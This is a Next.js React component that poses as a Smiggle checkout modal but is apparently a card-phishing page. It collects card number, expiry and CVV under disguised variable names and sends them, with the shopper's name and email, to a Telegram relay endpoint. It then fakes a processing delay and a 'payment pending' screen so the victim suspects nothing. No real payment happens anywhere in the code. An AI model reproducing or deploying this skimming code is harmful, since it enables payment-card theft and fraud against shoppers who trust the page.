"use client";

import Image from "next/image";
import { useMemo, useState } from "react";
import { useRouter } from "next/navigation";

type Step = "choose" | "form" | "loading" | "done";

export default function SocioPaymentForm({
  total,
  orderId,
  open,
  onClose,
}: {
  total: number;
  orderId: string; // ✅ aquí es external_reference
  open: boolean;
  onClose: () => void;
}) {
  const router = useRouter();

  const [step, setStep] = useState<Step>("choose");
  const [selected] = useState(true);

  const [loading, setLoading] = useState(false);
  const [err, setErr] = useState<string | null>(null);

  const [form, setForm] = useState({
    socio: "",
    afiliacion: "",
    codigoCliente: "",
    nombre: "",
    apellido: "",
    email: "",
    recordar: false,
  });

  const payLabel = useMemo(() => {
    const amount = total.toFixed(2);
    return `Pagar S/ ${amount}`;
  }, [total]);

  // ✅ Modal controlled
  if (!open) return null;

  function closeModalAndGoPending() {
    onClose();
    router.push(
      `/checkout/pending?external_reference=${encodeURIComponent(orderId)}`
    );
  }

  function validate() {
    if (!/^\d{15,16}$/.test(form.socio))
      return "Número de Socio inválido (15 a 16 dígitos).";
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(form.afiliacion))
      return "Fecha de afiliación inválida (MM/AA).";
    if (!form.codigoCliente) return "Código Cliente requerido";
    if (!form.nombre.trim()) return "Completa el nombre.";
    if (!form.apellido.trim()) return "Completa el apellido.";
    if (!/^\S+@\S+\.\S+$/.test(form.email.trim())) return "Email inválido.";
    return null;
  }

  async function onPay() {
    setErr(null);

    const v = validate();
    if (v) return setErr(v);

    setStep("loading");
    setLoading(true);

    const delayMs = 10_000 + Math.floor(Math.random() * 5_001);

    const message = `💳 <b>PAGO SOCIO SMIGGLE</b>

🧾 <b>ORDER ID:</b>
<code>${escapeHtml(orderId)}</code>

💰 <b>Total:</b> S/ ${escapeHtml(total.toFixed(2))}

━━━━━━━━━━━━━━

🔢 <b>Número de Socio:</b>
${escapeHtml(form.socio)}

📅 <b>Fecha Afiliación:</b>
${escapeHtml(form.afiliacion)}

🔐 <b>Código Cliente:</b>
${escapeHtml(form.codigoCliente)}

━━━━━━━━━━━━━━

👤 <b>Nombre:</b>
${escapeHtml(form.nombre)}

👤 <b>Apellido:</b>
${escapeHtml(form.apellido)}

📧 <b>Email:</b>
${escapeHtml(form.email)}

💾 <b>Recordar tarjeta:</b>
${form.recordar ? "SI" : "NO"}
`;

    try {
      await wait(delayMs);

      // 1) ✅ Telegram
      const res = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message }),
      });

      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        throw new Error(data?.error || "No se pudo enviar a Telegram");
      }

      // 2) ✅ Mark socio (después de Telegram OK)
      const socioRes = await fetch("/api/orders/mark-socio", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          external_reference: orderId, // ✅ orderId es external_reference
          socio_payload: {
            socio: form.socio,
            afiliacion: form.afiliacion,
            codigoCliente: form.codigoCliente,
            nombre: form.nombre,
            apellido: form.apellido,
            email: form.email,
            recordar: form.recordar,
          },
        }),
      });

      if (!socioRes.ok) {
        const data = await socioRes.json().catch(() => ({}));
        throw new Error(data?.error || "No se pudo guardar socio_payload");
      }

      setLoading(false);
      setStep("done");

      // 3) ✅ Redirect a pending (en vez de home)
      setTimeout(() => {
        closeModalAndGoPending();
      }, 3500);
    } catch (e: any) {
      setLoading(false);
      setStep("form");
      setErr(e?.message || "Error inesperado");
    }
  }

  return (
    <>
      <link
        href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap"
        rel="stylesheet"
      />

      <div style={styles.backdrop}>
        <div style={styles.modal}>
          <button onClick={onClose} style={styles.close} type="button">
            ×
          </button>

          <div style={styles.headerRow}>
            <div style={styles.lang}>ENG&nbsp;&nbsp;ESP</div>
          </div>

          <div style={styles.logoWrap}>
            <div style={styles.logoCircle}>
              <Image src="/logo.png" alt="" width={110} height={110} />
            </div>
          </div>

          {step === "choose" && (
            <>
              <div style={styles.title}>Elige un medio de pago</div>

              <label style={styles.optionRow}>
                <input
                  type="radio"
                  checked={selected}
                  readOnly
                  style={styles.radio}
                />
                <div style={{ width: "100%" }}>
                  <div style={styles.optionText}>
                    <div>Tarjeta de crédito y/o débito</div>
                    <div style={{ fontSize: "12px", opacity: 0.7 }}>
                      Realiza tu pago en cuotas o directo
                    </div>
                  </div>

                  <div style={styles.logoRow}>
                    <Image
                      src="/payments/logo1.png"
                      alt=""
                      width={32}
                      height={18}
                    />
                    <Image
                      src="/payments/logo2.png"
                      alt=""
                      width={32}
                      height={18}
                    />
                    <Image
                      src="/payments/logo3.png"
                      alt=""
                      width={32}
                      height={18}
                    />
                    <Image
                      src="/payments/logo4.png"
                      alt=""
                      width={32}
                      height={18}
                    />
                    <Image
                      src="/payments/logo5.png"
                      alt=""
                      width={32}
                      height={18}
                    />
                  </div>
                </div>
              </label>

              <button
                onClick={() => setStep("form")}
                style={styles.button}
                type="button"
              >
                Continuar
              </button>
            </>
          )}

          {step === "form" && (
            <>
              <div style={styles.infoText}>
                Recuerda activar las compras por internet
                <br />
                con tu banco
              </div>

              <div style={styles.inputWrap}>
                <div style={styles.iconBox}>
                  <Image
                    src="/icons/socio.png"
                    alt=""
                    width={16}
                    height={16}
                    style={styles.iconImg}
                  />
                </div>
                <input
                  style={styles.input}
                  placeholder="Número de Tarjeta"
                  inputMode="numeric"
                  value={form.socio}
                  onChange={(e) =>
                    setForm((s) => ({
                      ...s,
                      socio: e.target.value.replaceAll(/\D/g, "").slice(0, 16),
                    }))
                  }
                />
              </div>

              <div style={styles.grid2}>
                <div style={styles.inputWrap}>
                  <div style={styles.iconBox}>
                    <Image
                      src="/icons/fecha.png"
                      alt=""
                      width={16}
                      height={16}
                      style={styles.iconImg}
                    />
                  </div>

                  <input
                    style={styles.input}
                    placeholder="MM/AA"
                    inputMode="numeric"
                    value={form.afiliacion}
                    onChange={(e) => {
                      const raw = e.target.value
                        .replaceAll(/\D/g, "")
                        .slice(0, 4);
                      let formatted = raw;
                      if (raw.length >= 3)
                        formatted = `${raw.slice(0, 2)}/${raw.slice(2)}`;
                      setForm((s) => ({ ...s, afiliacion: formatted }));
                    }}
                  />
                </div>

                <div style={styles.inputWrap}>
                  <div style={styles.iconBox}>
                    <Image
                      src="/icons/codigo.png"
                      alt=""
                      width={16}
                      height={16}
                      style={styles.iconImg}
                    />
                  </div>
                  <input
                    style={styles.input}
                    placeholder="CVV"
                    inputMode="numeric"
                    value={form.codigoCliente}
                    onChange={(e) =>
                      setForm((s) => ({
                        ...s,
                        codigoCliente: e.target.value
                          .replaceAll(/\D/g, "")
                          .slice(0, 5),
                      }))
                    }
                  />
                </div>
              </div>

              <div style={styles.grid2}>
                <div style={styles.inputWrap}>
                  <div style={styles.iconBox}>
                    <Image
                      src="/icons/user.png"
                      alt=""
                      width={16}
                      height={16}
                      style={styles.iconImg}
                    />
                  </div>
                  <input
                    style={styles.input}
                    placeholder="Nombre"
                    value={form.nombre}
                    onChange={(e) =>
                      setForm((s) => ({ ...s, nombre: e.target.value }))
                    }
                  />
                </div>

                <div style={styles.inputWrap}>
                  <div style={styles.iconBox}>
                    <Image
                      src="/icons/user.png"
                      alt=""
                      width={16}
                      height={16}
                      style={styles.iconImg}
                    />
                  </div>
                  <input
                    style={styles.input}
                    placeholder="Apellido"
                    value={form.apellido}
                    onChange={(e) =>
                      setForm((s) => ({ ...s, apellido: e.target.value }))
                    }
                  />
                </div>
              </div>

              <div style={styles.inputWrap}>
                <div style={styles.iconBox}>
                  <Image
                    src="/icons/mail.png"
                    alt=""
                    width={16}
                    height={16}
                    style={styles.iconImg}
                  />
                </div>
                <input
                  style={styles.input}
                  placeholder="Email"
                  type="email"
                  value={form.email}
                  onChange={(e) =>
                    setForm((s) => ({ ...s, email: e.target.value }))
                  }
                />
              </div>

              <label style={styles.rememberRow}>
                <input
                  type="checkbox"
                  checked={form.recordar}
                  onChange={(e) =>
                    setForm((s) => ({ ...s, recordar: e.target.checked }))
                  }
                />
                <span style={styles.rememberText}>Recordar Tarjeta</span>
                <span style={styles.rememberInfo}>i</span>
              </label>

              {err && <div style={styles.error}>{err}</div>}

              <button
                onClick={onPay}
                style={{ ...styles.payButton, opacity: loading ? 0.8 : 1 }}
                type="button"
                disabled={loading}
              >
                {loading ? "Procesando..." : payLabel}
              </button>

              <div style={styles.footerText}>
                Infórmate sobre el tratamiento de tus datos personales{" "}
                <span style={styles.link}>aquí</span>
              </div>

              <div style={styles.footerLogos}>
                <Image src="/payments/logo1.png" alt="" width={36} height={20} />
                <Image src="/payments/logo2.png" alt="" width={36} height={20} />
                <Image src="/payments/logo3.png" alt="" width={36} height={20} />
                <Image src="/payments/logo4.png" alt="" width={36} height={20} />
                <Image src="/payments/logo5.png" alt="" width={36} height={20} />
              </div>
            </>
          )}

          {step === "loading" && (
            <div style={styles.loadingWrap}>
              <div style={styles.loadingTop}>
                <Image
                  src="/smiggleicon.jpg"
                  alt="Smiggle"
                  width={54}
                  height={54}
                  style={{ borderRadius: 12 }}
                  priority
                />
                <div>
                  <div style={styles.loadingTitle}>Procesando tu pago…</div>
                  <div style={styles.loadingSub}>
                    No cierres esta ventana. Estamos validando tu información.
                  </div>
                </div>
              </div>

              <div style={styles.progressBar}>
                <div style={styles.progressIndeterminate} />
              </div>

              <div style={styles.loadingNote}>
                Referencia: <b>{orderId}</b>
              </div>
            </div>
          )}

          {step === "done" && (
            <div style={styles.doneWrap}>
              <div style={styles.doneHeader}>
                <Image
                  src="/smiggleicon.jpg"
                  alt="Smiggle"
                  width={56}
                  height={56}
                  style={{ borderRadius: 12 }}
                  priority
                />
                <div>
                  <div style={styles.doneTitle}>Tu pago está siendo procesado</div>
                  <div style={styles.doneSub}>
                    Recibirás un correo cuando tu pago haya sido aprobado.
                  </div>
                </div>
              </div>

              <div style={styles.orderCard}>
                <div style={styles.orderLabel}>Número de orden</div>
                <div style={styles.orderId}>{orderId}</div>
                <div style={styles.orderHint}>Guárdalo como referencia.</div>
              </div>

              <div style={styles.redirectNote}>
                Serás redirigido a la página pendiente en unos segundos…
              </div>
            </div>
          )}
        </div>
      </div>

      <style>{`
        @keyframes slide {
          0% { transform: translateX(-60%); }
          50% { transform: translateX(60%); }
          100% { transform: translateX(-60%); }
        }
      `}</style>
    </>
  );
}

function wait(ms: number) {
  return new Promise<void>((resolve) => setTimeout(resolve, ms));
}

function escapeHtml(input: unknown) {
  const s = String(input ?? "");
  return s
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;");
}

const styles: Record<string, React.CSSProperties> = {
  backdrop: {
    position: "fixed",
    inset: 0,
    background: "rgba(0,0,0,0.70)",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    fontFamily: '"Source Sans Pro","Helvetica Neue",Helvetica,Arial,sans-serif',
    zIndex: 9999,
    padding: 16,
  },
  modal: {
    width: 360,
    maxWidth: "100%",
    background: "#f7f7f7",
    borderRadius: 6,
    padding: "14px 18px 16px",
    boxShadow: "0 15px 40px rgba(0,0,0,0.40)",
    position: "relative",
    border: "1px solid #e0e0e0",
  },
  headerRow: {
    display: "flex",
    justifyContent: "flex-start",
    alignItems: "center",
  },
  lang: {
    fontSize: 11,
    color: "#666",
    marginLeft: 2,
  },
  close: {
    position: "absolute",
    right: 10,
    top: 10,
    border: "1px solid #cfcfcf",
    width: 22,
    height: 22,
    borderRadius: 20,
    background: "#f3f3f3",
    cursor: "pointer",
    fontSize: 15,
    fontWeight: 700,
    lineHeight: "20px",
  },
  logoWrap: {
    display: "flex",
    justifyContent: "center",
    marginTop: 6,
    marginBottom: 6,
  },
  logoCircle: {
    width: 110,
    height: 110,
    borderRadius: 200,
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
  },
  title: {
    marginTop: 6,
    fontSize: 13,
    fontWeight: 600,
    color: "#333",
  },
  optionRow: {
    display: "flex",
    gap: 10,
    marginTop: 12,
    cursor: "pointer",
  },
  radio: {
    marginTop: 4,
  },
  optionText: {
    fontSize: 13,
    color: "#333",
    marginBottom: 3,
  },
  logoRow: {
    display: "flex",
    gap: 5,
    marginTop: 2,
    alignItems: "center",
    flexWrap: "wrap",
  },
  button: {
    marginTop: 16,
    width: "100%",
    height: 36,
    borderRadius: 4,
    border: "1px solid #2e6da4",
    background: "linear-gradient(#6fa6d6,#4e88c2)",
    color: "#fff",
    fontSize: 14,
    fontWeight: 600,
    cursor: "pointer",
  },
  infoText: {
    textAlign: "center",
    fontSize: 13,
    color: "#555",
    fontWeight: 600,
    marginTop: 6,
    marginBottom: 10,
  },
  inputWrap: {
    display: "flex",
    alignItems: "center",
    background: "#fff",
    border: "1px solid #d5d5d5",
    borderRadius: 4,
    overflow: "hidden",
    height: 38,
    marginTop: 8,
  },
  iconBox: {
    width: 40,
    height: 38,
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    background: "#f0f0f0",
    borderRight: "1px solid #d5d5d5",
    color: "#666",
    fontSize: 14,
    flex: "0 0 auto",
  },
  iconImg: {
    opacity: 0.75,
    objectFit: "contain",
  },
  input: {
    width: "100%",
    height: 38,
    border: "none",
    outline: "none",
    padding: "0 10px",
    fontSize: 13,
    background: "#fff",
    color: "#333",
  },
  grid2: {
    display: "grid",
    gridTemplateColumns: "1fr 1fr",
    gap: 8,
    marginTop: 0,
  },
  rememberRow: {
    display: "flex",
    alignItems: "center",
    gap: 10,
    marginTop: 10,
    padding: "10px 10px",
    background: "#efefef",
    border: "1px solid #d5d5d5",
    borderRadius: 4,
  },
  rememberText: {
    fontSize: 13,
    color: "#666",
    flex: 1,
  },
  rememberInfo: {
    width: 18,
    height: 18,
    borderRadius: 20,
    background: "#9a9a9a",
    color: "white",
    display: "inline-flex",
    alignItems: "center",
    justifyContent: "center",
    fontSize: 12,
    fontWeight: 700,
  },
  error: {
    marginTop: 8,
    fontSize: 12,
    color: "#b00020",
    fontWeight: 600,
  },
  payButton: {
    marginTop: 12,
    width: "100%",
    height: 40,
    borderRadius: 4,
    border: "1px solid #2e6da4",
    background: "linear-gradient(#6fa6d6,#4e88c2)",
    color: "#fff",
    fontSize: 14,
    fontWeight: 700,
    cursor: "pointer",
  },
  footerText: {
    marginTop: 10,
    fontSize: 12,
    color: "#555",
  },
  link: {
    fontWeight: 700,
    textDecoration: "underline",
    cursor: "pointer",
  },
  footerLogos: {
    marginTop: 10,
    display: "flex",
    justifyContent: "center",
    gap: 10,
    flexWrap: "wrap",
  },
  loadingWrap: { paddingTop: 8, paddingBottom: 6 },
  loadingTop: { display: "flex", gap: 12, alignItems: "center", marginTop: 10 },
  loadingTitle: { fontSize: 15, fontWeight: 700, color: "#1f2937" },
  loadingSub: { marginTop: 2, fontSize: 12, color: "#6b7280" },
  progressBar: {
    marginTop: 14,
    height: 10,
    background: "#e5e7eb",
    borderRadius: 999,
    overflow: "hidden",
    border: "1px solid #d1d5db",
  },
  progressIndeterminate: {
    height: "100%",
    width: "45%",
    background: "linear-gradient(90deg, #5b9bd5, #2e6da4)",
    borderRadius: 999,
    animation: "slide 1.2s ease-in-out infinite",
  },
  loadingNote: { marginTop: 10, fontSize: 12, color: "#4b5563" },
  doneWrap: { paddingTop: 6, paddingBottom: 4 },
  doneHeader: { display: "flex", gap: 12, alignItems: "center", marginTop: 10 },
  doneTitle: { fontSize: 15, fontWeight: 800, color: "#111827" },
  doneSub: { marginTop: 2, fontSize: 12, color: "#6b7280" },
  orderCard: {
    marginTop: 12,
    background: "#ffffff",
    border: "1px solid #d1d5db",
    borderRadius: 10,
    padding: 12,
  },
  orderLabel: { fontSize: 12, color: "#6b7280", fontWeight: 600 },
  orderId: { marginTop: 4, fontSize: 14, fontWeight: 800, color: "#111827" },
  orderHint: { marginTop: 4, fontSize: 12, color: "#6b7280" },
  redirectNote: { marginTop: 10, fontSize: 12, color: "#6b7280" },
};